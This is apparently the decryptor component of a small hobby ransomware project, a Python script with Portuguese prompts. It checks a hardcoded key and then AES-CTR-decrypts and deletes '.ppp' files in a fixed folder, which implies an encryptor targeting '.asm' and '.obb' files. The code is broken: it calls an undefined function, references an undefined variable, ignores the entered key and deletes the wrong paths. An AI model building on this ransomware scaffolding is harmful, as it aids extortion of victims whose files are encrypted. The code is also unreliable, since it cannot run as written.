import os, glob, time, pyaes
from pathlib import Path

lst_arq = ["*.asm", "*.obb"]

try:
	desktop = Path.home() / "/home/luiz/teste/"
#	download = Path.home() / "Downloads"
except Exception:
	pass

os.chdir(desktop)

def descrypt(decrypt_file):
	try:
		for file in glob.glob('*.ppp'):

			keybytes = decrypt_file_encode()
			name_file = open(file, 'rb')
			file_data = name_file.read()
			dkey = keybytes # 16 bytes key - change for your key
			daes = pyaes.AESModeOfOperationCTR(dkey)
			decrypt_data = daes.decrypt(file_data)

			format_data = file.split('.')
			new_file_name = format_file[0] + '.' + format_file[1]

			dnew_file = open(f'{desktop}/{format_file}', 'wb')
			dnew_file.write(decrypt_data)
			dnew_file.close()
	except ValueError as err:
		print('Chave Invalida')



if __name__ == '__main__':
	key = input('meta a chave para descriptografar:')
	if key == '1ab2c3e4f5goh7i8':
		print('Descriptografando...')
		time.sleep(1)
		descrypt(key)
		for del_file in glob.glob('*.ppp'):
			os.remove(f'{desktop}/{format_file}')
	else:
		print('erro a chave meu bom')


